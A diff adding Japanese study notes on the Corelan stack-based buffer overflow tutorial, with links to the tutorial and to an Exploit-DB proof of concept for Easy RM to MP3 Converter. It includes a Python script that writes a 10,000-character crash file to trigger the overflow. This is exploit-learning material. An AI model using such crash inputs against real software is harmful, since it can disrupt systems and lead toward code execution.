@@ -264,6 +264,31 @@ Instruction Name(opcode) destination operand source operand
 
 # Windows OS
 
+# Corelan tutorial
+以下のサイトを見ながら、バッファオーバーフローの脆弱性を実際にどうやって見つけて、どうやってエクスプロイトコードを書くかを体験する。
+https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/
+
+今回脆弱性が報告されたアプリケーションのPoCは以下。
+https://www.exploit-db.com/exploits/10619
+
+## あ
+1. pythonでファイルを作ってEasyRMtoMP3Converterに食わせる
+   1.1 以下のpythonスクリプトを作成して実行する
+       ```.py
+       file = 'crash.m3u'
+       junk = 'A' * 10000
+       f = open(file, 'w')
+       f.write(junk)
+       f.close()
+       print('your exploit code created successfully')
+       ```
+       > [!NOTE]
+       > Corelanの中ではPerlで書かれてるがPythonの方が一般的なのでPythonで書き直している。また、ここでは'A'の文字を10000回書き込んだファイルを作成している。       
+   
+   1.2 Converterに食わせる
+        ドラッグアンドドロップで簡単に食わせることができる。以下のようになるはず。変な挙動。
+![image](https://github.com/cyber-mamba/red-teaming/assets/96987448/7768013b-d8d3-45fd-8651-18a6e31fa865)
+![image](https://github.com/cyber-mamba/red-teaming/assets/96987448/20ecccd3-89ae-473d-abd3-9b689782bb01)
 
 
 
